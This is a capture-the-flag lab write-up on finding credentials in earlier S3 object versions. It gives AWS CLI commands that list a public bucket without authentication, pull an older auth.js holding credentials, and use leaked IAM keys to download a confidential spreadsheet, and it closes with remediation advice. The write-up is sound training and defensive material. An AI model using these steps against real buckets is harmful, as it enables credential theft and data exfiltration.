https://pwnedlabs.io/labs/hunt-for-secrets-in-git-repos

---
## Vulnerability Summary
The environment is vulnerable to information disclosure through improper S3 bucket permissions 
and the historical retention of sensitive data via S3 Object Versioning.

1. **Information Disclosure**: Misconfigured S3 bucket policies allowed unauthenticated 
   listing of bucket contents and object metadata, revealing private file paths.
2. **Improper Versioning Security**: S3 Object Versioning was enabled without 
   corresponding access controls, allowing attackers to retrieve previous versions of files 
   that contained hardcoded credentials.
3. **Credential Harvesting**: By inspecting older versions of `auth.js` obtained via 
   `aws s3api get-object`, an attacker recovered plain-text credentials for the application.
4. **Privilege Escalation & Impact**: Credential reuse on the web dashboard allowed 
   access to an administrative profile containing static AWS IAM keys, leading to the 
   exfiltration of sensitive corporate documents (`.xlsx`) protected by S3 versioning.

---
## Walkthrough
Enumerate the s3 bucket with provided IP:

```bash
nmap -Pn 16.171.123.169
	80/http
```

Web page inspection reveals bucket: `https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com`.
Enumerate the files in the bucket `huge-logistics-dashboard`

```bash
aws s3 ls huge-logistics-dashboard --no-sign-request
                           PRE private/
                           PRE static/
aws s3 ls s3://huge-logistics-dashboard --no-sign-request --recursive
	# Inspect these files for possible cleartext creds
```

Enumerate the bucket for `x-amz-version-id`:

```bash
curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
	x-amz-version-id: abcdefg0123456789.abcdefg
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard                          # Doesn't work
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --no-sign-request                    # Doesn't work
aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
		x-amz-version-id: abcdefg0123456789.abcdefg
```

In addition to confirming the `x-amz-veriond-id` for `auth-id`, we also can see the info for a confidential `.xlsx`. AND, we see another `auth.js` with a different version id. Try to get the objects with the version id:

```bash
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" test.xlsx --no-sign-request                            # Failed
aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js" --version-id "XXXXXXXXXXXXXXXXXXXXXXX" auth_previous.js --no-sign-request                               # Success
	email
	password
```

Now we can login to the dashboard with the creds found in `auto_previous.js`! Going to profile, we find AWS keys. Use them to login and grab that confidential `.xlsx` file we saw earlier with the `version-id`:

```bash
aws configure --profile admin
aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" 'Business Health - Board Meeting (Confidential).xlsx' --profile admin
```

We find the flag in this `.xlsx`

---
## Remediations
1. **S3 Bucket Security**:
   - Apply the **Principle of Least Privilege (PoLP)** to S3 bucket policies; disable 
     public read access unless strictly required for public assets.
   - Restrict `s3:ListBucket` and `s3:GetObject` permissions to specific IAM 
     principals only.

2. **Secrets Management**:
   - **Never hardcode credentials** in source code or static files like `auth.js`.
   - Use centralized services like **AWS Secrets Manager** or **Parameter Store** to 
     manage sensitive configuration data.
   - Implement automated secret scanning (e.g., TruffleHog or Gitleaks) to detect 
     secrets committed to repositories before they are deployed to buckets.

3. **Versioning & Lifecycle Policies**:
   - Ensure that sensitive buckets have strictly defined IAM policies, as 
     versioning provides a history that may contain "deleted" secrets.
   - Utilize **S3 Lifecycle Policies** to permanently delete or transition old object 
     versions to secure storage if they are no longer required.